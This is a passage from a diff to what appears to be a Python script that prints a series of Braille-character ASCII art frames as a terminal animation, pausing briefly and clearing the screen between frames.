+⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⡀⣿⣯⣀⡴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠈⢷⠈
+⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠟⠲⢾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀
+⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣆⠀⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀
+⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠁⠀⠀⠀
+⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠀⠀⠀⠀
+⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀
+⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀⠀
+⣿⣿⣿⠟⠙⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠃⠀⠀⠀⠀⠀
+⠛⠉⠀⠀⣀⣤⡿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⠀⠀⠀⠀⠀⠀
+⠀⣀⡴⠞⠉⠀⠀⠈⣙⡷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠁⠀⠀⠀⠀⠀⠀⠀
+⠈⠁⠀⠀⠀⠀⠀⠀⠀⠸⡄⣹⣿⣶⣤⣤⣄⣀⣀⣀⣀⣀⣀⣀⢈⢻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣺⣾⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣠⡤⠶⠟⠛⠋⠁⠀⠀⠀⠈⣉⣽⠿⠛⠉⣩⣿⢿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣀⠀⠤⠞⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⠟⠋⠀⣠⡴⠟⠋⠀⠀⠈⣋⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣴⣾⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢛⡉⣀⡀⢀⡀⠀⠀⠀⠀⠀⠀⣠⡶⠞⠋⣀⣠⠶⠟⠋⠀⠀⠀⠀⢠⣶⣿⣿⣿⣿⣿⣿⣶⣶⣶⣤⣤⣤⣤⣤⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+
+
+
+
+
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+
+
+
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠂⠀⠤⡀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⢂⣤⣴⠖⠉⠉⠲⣶⣤⠀⠀⢀⠐⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣢⡤⢇⣾⣏⣿⠀⢠⠀⠄⣿⣿⣿⡄⠘⠃⠀⠆⠀⠀
+⠀⠀⠀⠀⠀⠀⠐⢡⣀⠉⠀⠚⣿⣿⣿⣴⣿⢸⣿⣿⣿⡿⠀⠖⠀⡔⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠘⠏⠀⠀⣨⠃⣿⣿⣿⣿⣾⣹⣿⣿⠃⣄⣴⡞⠑⡄⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣈⣬⣤⣴⣶⣾⣿⣿⣯⣽⣿⣿⣷⣧⡎⠈⣿⠐⠐⠇⢴⠖
+⠀⠀⠀⠀⢀⠴⠋⠁⠀⠀⠀⠈⢙⠉⡹⠋⠉⠀⠀⠉⠙⠻⣦⡃⠒⣲⢀⠿⠄
+⠀⠀⢀⠔⠁⠀⠀⠀⠀⠀⠀⠀⡀⢠⠁⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣾⠀⠀⠀
+⠀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⢠⠁⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⠀⠀⠀
+⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⢦⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀
+⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣶⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⠀⠀
+⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡔⠁⠀⠀
+⠀⠈⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣮⢃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠀⠀⠀⠀
+⠀⠀⠈⣷⣦⣀⣀⣀⠀⣀⣠⣾⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀
+⠀⠀⠀⠘⢿⣿⣿⣿⡽⢿⣿⣿⡟⠹⣿⣷⣦⣤⣤⣤⣤⣶⣿⠏⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⣽⣿⣿⢿⡟⣿⡟⠡⣄⣽⣉⣻⣿⣟⣟⢟⡿⡭⣤⠀⠀⠀⠀⠀
+
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+
+
+
+
+
+
+
+     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠛⠛⠙⢶⡻⢿⡶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠒⣆⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⠀⣀⣀⣈⣙⣆⠙⢦⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠁⠀⠀⠘⣦⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣠⠶⠋⢉⣉⠀⠀⠉⠁⠈⢳⡀⠙⢦⣀⣀⣀⣠⠤⣤⣤⣤⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⡾⣿⣟⣤⡶⠆⠀⠀⠀⠘⣆⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠟⠁⢠⣾⠭⠀⠀⠀⠀⣠⡤⠤⣷⡀⠀⠀⢠⣴⣴⠚⠉⠀⠀⠀⠀⠀⠈⠉⠛⠛⠲⣤⣀⠀⣠⡴⠛⣩⠟⠩⠞⠉⢠⠏⠀⠀⠀⠀⠀⠀⢻⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡏⠀⣴⣋⣀⣀⢀⡠⠖⠉⠁⠀⠀⠀⣩⡀⣠⠟⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠉⠩⢡⣠⠞⠁⠀⠀⠀⠀⠉⠉⠉⢉⣷⠆⠀⠀⠀⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣯⡇⠐⠋⢱⠏⠴⣫⠄⠀⠀⠀⠀⣠⠞⢁⣼⡽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠉⡁⠀⠀⠀⠻⣄⢀⠀⠀⠀⠀⠀⢰⣾⡉⠀⠀⠀⠀⠀⢳
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢻⠀⣠⠞⠁⣠⠞⠁⠀⠀⡤⠀⡼⠃⢠⣾⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⡴⠁⠀⠀⠀⠀⠘⠯⢦⡀⠀⠀⠀⠈⠻⣽⠀⠀⠀⠀⠀⢸
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡎⣯⡾⠁⢀⡼⠁⠀⠀⠀⡜⠁⡸⠃⣠⠟⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠋⠀⢀⣾⠁⣰⠀⠀⠀⠀⠸⡆⠈⠿⢦⡀⠀⠀⢀⡹⡄⠀⠀⠀⠀⢸
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⢋⡄⢀⠟⢀⡞⠀⠀⣸⠁⠀⠃⢠⠋⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⢹⠀⢻⠀⠀⠀⠀⠀⣹⡀⠀⠈⢳⡀⢳⡀⣿⠃⠀⠀⠀⠀⡸
+⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠡⢏⣴⠏⢠⡎⠀⠀⣰⡇⠀⠀⢰⠇⠄⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠀⢸⠀⡾⠀⠀⠀⡀⠀⢡⣷⠀⠀⠀⠹⠌⠱⣯⠀⠀⠀⠀⠀⡇
+⠀⠀⠀⠀⠀⠀⢀⡞⠁⣴⡵⢿⡏⠀⡾⠀⠀⣠⢻⡇⠀⢠⠏⠠⠀⢸⣀⣴⣤⠀⠀⠀⠀⠀⠀⠀⣄⣤⣾⠋⠀⠀⠸⡄⣿⡆⠀⠀⢻⠀⠘⣟⡇⠀⠀⠀⠀⠀⢨⣷⠀⠀⠀⠀⠑
+⠀⠀⠀⠀⢀⣴⢋⢀⣼⠟⠀⡼⠁⣸⠃⠀⣰⠃⢸⡇⢰⡟⢀⣀⣤⢶⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠉⠉⠓⢦⣄⣧⣿⣧⠀⠀⠘⡇⠀⢹⣷⠀⠀⠀⠀⠀⠀⢷⢧⡀⠀⠀⡀
+⠀⠀⠀⢀⣾⣿⢋⣼⠏⠀⢸⠇⠀⡟⠀⢰⠇⠒⣸⣧⢾⠗⠛⠉⠁⠀⢳⡀⠀⠀⠀⠀⠀⠀⢸⢃⡟⠀⠀⠀⠀⠀⠈⢿⣼⢸⡆⠀⠀⢻⠀⠸⣿⡇⠀⠀⠀⠀⠀⠸⡎⢣⠀⠀⠁
+⠀⠀⣰⣿⡾⠀⣼⡇⠀⠀⡞⢀⣾⠃⢠⡏⠐⠋⠀⠙⠾⢦⠀⠤⠤⠤⣌⣧⡀⠀⠀⠀⠀⢠⣾⣾⠀⠀⠀⣀⣀⡀⠀⠘⣯⡇⢿⣄⠀⢸⡆⠀⡏⡇⠀⠀⠀⠀⠀⠀⡇⠀⠀⠁⠀
+⠀⣴⣽⡿⠁⣸⢹⠀⠀⠀⣿⡼⠉⡇⡸⠁⠀⠀⠀⠀⠀⠀⠀⣀⠀⣀⣀⡘⣷⣄⠀⠀⠀⡞⣷⡏⠀⠀⠊⠉⠈⠉⠁⠀⢻⣧⠈⣧⠀⢸⡇⠀⢹⡇⠀⠀⠀⠀⠀⠀⠇⠀⠀⠈⠀
+⣼⡿⣽⠃⠀⠻⣼⠀⠀⠀⢿⡇⢠⢷⡇⠀⠀⢀⣤⣤⣀⣤⣤⣤⡤⢤⣄⡀⠈⠉⠣⣄⣰⡇⣿⠁⠀⠒⠒⠤⣤⣀⡀⠀⠀⢻⡆⠘⣆⠈⡇⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⡟⣰⡟⠀⠀⢀⡏⠀⠀⠀⠈⠑⡼⣀⣙⣶⣶⣿⣛⡉⣉⣉⢉⠉⣙⡿⠟⠀⠀⠀⠀⠀⠉⢉⡩⠄⠀⣤⣶⡶⠿⣶⣾⣽⣄⡀⢳⡀⢹⢰⡇⠀⢸⠇⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⡄
+⢠⡟⠀⠀⠀⣼⠀⠀⠀⠀⠀⢠⡇⢿⣿⡋⠹⣅⠀⡙⢛⠛⣁⠤⢞⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣌⠓⢦⡀⠀⠀⣙⣻⣷⣿⣾⡟⢸⠀⡜⠀⠀⣠⠃⠀⠀⠀⡆⠀⠀⠀⠃
+⡸⠀⠀⠀⢀⡏⠀⠀⠀⢀⠇⣸⡇⠀⠈⢻⠺⣻⠷⠟⠉⠉⢉⣩⠟⣉⡀⢀⣀⠄⡀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠒⠿⢯⣁⡀⣘⡷⠟⠻⣧⣼⡀⠀⠀⢀⡟⠀⠀⠀⢀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢸⠁⠀⠀⠀⣾⢀⣿⠃⠀⠀⠀⠉⢁⣄⣤⠤⠒⠟⠒⠉⠉⠁⠀⠀⠉⠀⠀⠀⠀⠈⠀⠂⠀⠀⠀⠀⠀⠀⠈⠧⣭⡄⠐⠚⠛⢫⠇⠀⢀⡼⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⡾⠀⠀⠀⣸⠃⣸⣿⠂⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⡼⠁⠀⠀⠀⢠⡇⠀⠀⠀⠀⠃
+⠀⠀⠀⢰⡇⠀⠀⠀⣿⢠⡟⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠁⠀⡼⠁⠀⠀⠀⢀⣾⣄⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⠇⠀⠀⠀⣧⣿⢳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠒⠛⠛⠓⠢⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⡾⠁⠀⠀⡀⠀⣼⢞⣯⡆⠀⠀⠀⠀
+⠀⠀⣸⣹⠀⠀⠀⢸⣿⣯⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠏⠀⣷⣶⣶⣶⣶⣤⣉⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠃⢀⡾⠀⠀⠀⣰⠀⢰⠇⠈⠛⡇⠀⠀⠀⠀
+⠀⢀⣿⡟⠀⠀⢀⢸⣿⣯⣧⣧⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠈⣿⣤⣀⣹⣿⣿⣿⣿⣿⣿⣷⣯⣱⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠁⣰⠏⠀⠀⠀⣰⠃⢀⡿⠊⠁⢠⠇⠀⢀⠀⠀
+⠀⣸⡟⡇⡄⠀⣾⢻⡻⣿⡇⡹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⣠⠏⢀⡾⠁⣠⣶⠀⡰⠃⠀⠞⠀⣠⣿⠏⠀⠀⡞⠀⠀
+⠀⣿⠀⡇⣿⠀⠙⣾⣧⣿⡇⠀⠹⣄⠀⠀⠀⣀⡴⠖⠦⣄⠀⢸⣿⣿⡿⠛⠛⠛⠛⠛⠛⢿⡏⠀⠀⠀⠀⠀⠀⠀⢠⡾⠁⠰⠋⠠⢞⣽⣙⣛⠃⠀⡴⠒⢉⡽⠋⠀⠀⡼⠁⠀⠀
+⠀⡏⠀⢹⢻⡀⠀⡞⡟⠻⡇⠀⠀⢿⣄⠀⢸⡁⠀⠀⠀⣸⠀⠘⣿⠏⠀⠀⠀⠀⠀⠀⣠⠟⠁⠀⠀⠀⠀⠀⢀⡴⠋⣴⠀⠀⠀⠀⠉⢈⣨⠛⣠⣼⣁⡴⠋⠀⠀⣀⣰⠃⠀⠀⠀
+⠀⡇⠀⠘⣿⣷⠶⢸⡆⠀⢿⠀⣠⣿⣿⣧⡀⠙⢦⣀⡤⠏⠀⠀⠉⠽⣒⣲⣶⣖⡨⠟⠛⠀⠀⠀⠀⠀⢀⣴⠋⢀⡾⠁⠀⠀⠀⠀⢠⣨⠏⠃⣾⡿⢋⠀⠀⠀⡴⢹⠃⠀⠀⠀⠀
+⠀⠀⠀⠀⠙⣿⡗⠚⡇⠀⢹⠓⠿⠋⠋⠙⠿⣄⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠹⡄⡀⠀⠀⠀⠀⠀⢀⡴⠋⢀⣴⡿⣿⣀⣠⣤⡤⠀⡿⠃⠀⣾⠏⢠⠞⠀⠀⡼⢡⡏⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠹⣿⠁⢧⢀⣿⡿⠄⠀⠀⠀⠀⠈⢷⣄⠀⠒⠀⠀⠀⠀⠀⠀⠀⣧⡇⠀⠀⠀⣀⠴⠋⣀⠴⠋⣼⠳⠃⠉⢲⠊⠁⠀⠀⢀⡼⣿⣾⠏⠀⠀⡼⣡⣿⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢻⣣⣼⡍⠉⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠰⡇⢀⣤⢞⣡⠴⠚⠁⣀⣤⣧⠁⡠⢤⣬⡄⠀⠀⢀⡼⣹⣿⠃⠀⢀⡴⣵⢫⣿⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠈⢳⡿⣷⡀⠀⠀⠠⠄⢠⣴⣿⣿⣿⣿⣷⡀⠠⣄⡀⡀⠀⠀⠙⠛⣛⣛⣭⢤⣒⠛⡋⢁⠀⠀⠀⠀⢠⢀⣁⠀⣀⡞⢠⣿⠃⠀⢞⣾⣾⠇⢸⣇⠀⠀⠀⠀⠀⠀
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡁⠀⠀⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡶⠋⢀⣴⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⣠⣿⣿⣿⣻⣿⠛⣿⣿⢿⣷⡀⠀⠲⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠀⢀⣾⡿⢻⣿⡟⡛⠀⣼⢹⣿⡌⢷⠻⡄⠀⠈⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡞⠁⢀⣴⣿⠛⢡⣿⣿⡷⠀⠆⠀⠀⣿⣿⡘⡇⠘⡄⠀⠀⢹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠋⠀⠴⣿⠋⣁⡤⣸⣿⣿⡼⠃⠆⠀⢠⣿⢩⠁⢻⡀⢻⡀⠀⠀⠝⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡤⠶⠖⠋⠉⠳⣦⣾⠃⣠⡟⣰⠇⣾⣿⡇⠀⣀⣀⣸⡇⠀⢷⠀⠁⠀⢧⣴⠞⠉⠉⠙⠒⠲⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠖⠋⠁⡄⠀⠀⠀⢀⠀⢸⡅⢰⠏⡴⡅⢰⣿⢸⡄⠇⠷⠒⣿⠁⠀⣼⣇⠀⠀⠀⣧⠀⠀⣄⠀⠀⢳⡀⠈⠙⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠞⠉⠀⠀⠀⠀⣇⠀⠀⠀⠀⣠⣿⡇⢸⡄⢱⣧⠸⣿⡼⣷⠄⠀⣠⡿⡸⠀⣾⠈⢸⠀⠀⠹⣆⠀⠀⠙⠶⣾⠃⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣀⡤⠶⠋⠁⠀⠀⠀⠀⠀⠀⠘⣆⡉⣲⣾⣿⠿⡃⠈⣷⡘⠜⣆⠹⣷⠿⡇⢰⡿⢠⡇⢰⣇⠀⠀⠀⠀⠀⠻⢿⣄⡀⠰⠁⠀⠀⠀⠀⠀⠀⠀⠉⠓⠦⣄⡀⠀⠀
+⣀⣀⣀⡤⠶⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⣨⣿⠿⠍⠑⠈⠉⠀⠘⣧⠀⠸⣦⡹⣷⣿⠋⢀⡟⢰⣿⡏⠈⠀⠀⠀⠀⠀⠂⢈⢿⣍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⠗⠦
+⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⡀⠁⠀⠀⠀⠀⠀⢹⡝⡄⠹⣷⣿⣿⣀⡿⣴⣿⣿⠁⠀⠀⣴⠀⠀⠀⠀⠈⣼⣿⡷⣄⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡼⠋⠈⢿⡇⠇⠀⠀⠀⠀⠀⠠⡀⠻⣾⡀⢹⡿⣿⣿⣱⣿⢻⠃⣶⠠⡾⠁⠀⠀⠀⠀⠀⢸⢿⠃⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠟⠉⠀⠀⠀⠈⣿⠠⡀⠀⠀⠀⠀⠀⢳⣤⠸⡻⣾⣿⢻⣻⣿⣿⢆⡾⠀⠸⠀⠀⠀⠀⠀⠀⠀⢿⡟⠀⠀⠀⠀⠈⠛⢦⣀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⢸⡇⢀⠀⠀⠀⠀⠀⠀⠻⣇⠀⢿⣷⠀⠈⢸⣿⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠈⠳⢤⡀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠸⣦⠘⣿⠀⠀⢸⡟⢀⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀
+⠀⠀⠀⠀⣠⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣇⢻⡄⠀⣾⠃⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢆⠀
+⠀⠀⣠⠾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣾⠁⢠⣿⣾⠃⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠓
